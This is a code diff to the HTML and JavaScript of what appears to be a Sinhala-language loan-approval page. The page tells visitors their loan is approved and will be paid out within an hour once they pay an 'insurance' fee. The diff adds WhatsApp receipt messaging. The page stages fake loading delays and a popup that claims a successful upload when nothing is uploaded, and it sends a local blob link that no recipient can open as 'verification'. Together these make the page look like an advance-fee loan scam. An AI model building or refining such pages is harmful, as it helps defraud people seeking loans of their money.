@@ -165,7 +165,8 @@ canvas{
 
 <div class="statement">
 ඔබ ලබාගන්නා ණය මුදල අනුමත වී ඇත.<br><br>
-රක්ෂණ මුදල ගෙවා පැයක් ඇතුළත මුදල් බැර කෙරේ.
+රක්ෂණ මුදල ගෙවා පැයක් ඇතුළත මුදල් බැර කෙරේ.<br><br>
+රිසිට් පත WhatsApp හරහා එවනු ලැබේ.
 </div>
 
 <label>Upload Receipt</label>
@@ -175,7 +176,9 @@ canvas{
 
 <button class="pay-btn" onclick="payNow()">ගෙව්ම කරන ආකාරය / Pay Now</button>
 
-<button class="whatsapp-btn" onclick="sendWhatsApp()">WhatsApp Message</button>
+<button class="whatsapp-btn" onclick="sendWhatsApp()">
+මේ පිළිබඳ විස්තර WhatsApp Message
+</button>
 </div>
 </div>
 
@@ -201,10 +204,11 @@ const loading=document.getElementById("loading");
 const loadingText=document.getElementById("loadingText");
 
 let AUTO_CUSTOMER_ID="";
+let receiptPreviewURL="";
 
-/* LOADING FUNCTIONS */
-function showLoading(text){
- loadingText.innerText=text;
+/* LOADING */
+function showLoading(t){
+ loadingText.innerText=t;
  loading.style.display="flex";
 }
 function hideLoading(){
@@ -287,26 +291,29 @@ function goNext(){
    page1.style.display="none";
    page2.style.display="block";
   },4000);
-
  },6000);
+}
+
+/* RECEIPT PREVIEW LINK */
+receipt.onchange=e=>{
+ const file=e.target.files[0];
+ if(file){
+  receiptPreviewURL=URL.createObjectURL(file);
+ }
 }
 
 /* SUBMIT */
 function submitForm(){
- if(receipt.files.length===0){
+ if(!receiptPreviewURL){
   showPopup("කරුණාකර receipt upload කරන්න");
   return;
  }
- showLoading("Submitting...");
- setTimeout(()=>{
-  hideLoading();
-  showPopup("Receipt uploaded successfully");
- },2000);
+ showPopup("Receipt uploaded successfully. WhatsApp click කරන්න.");
 }
 
 /* PAY */
 function payNow(){
- showLoading("Redirecting to payment...");
+ showLoading("Redirecting...");
  setTimeout(()=>{
   hideLoading();
   window.open(PAY_LINK,"_blank");
@@ -315,12 +322,32 @@ function payNow(){
 
 /* WHATSAPP */
 function sendWhatsApp(){
+ if(!receiptPreviewURL){
+  showPopup("Receipt upload කරලා පසුව WhatsApp යවන්න");
+  return;
+ }
+
  showLoading("Preparing WhatsApp...");
+
  setTimeout(()=>{
   hideLoading();
-  const msg=`Customer ID: ${AUTO_CUSTOMER_ID}
-Insurance: Rs.${insurance.innerText}`;
-  window.open(`https://wa.me/${WHATSAPP_NO}?text=${encodeURIComponent(msg)}`,"_blank");
+
+  const msg=
+`📄 Loan Details ✅
+
+Customer ID: ${AUTO_CUSTOMER_ID}
+Loan Amount: Rs.${showAmount.innerText}
+Insurance Payment: Rs.${insurance.innerText}
+
+🧾 Receipt Preview:
+${receiptPreviewURL}
+
+⚠️ Note: Image link open කර verify කරගන්න.`;
+
+  window.open(
+   `https://wa.me/${WHATSAPP_NO}?text=${encodeURIComponent(msg)}`,
+   "_blank"
+  );
  },2000);
 }
 </script>
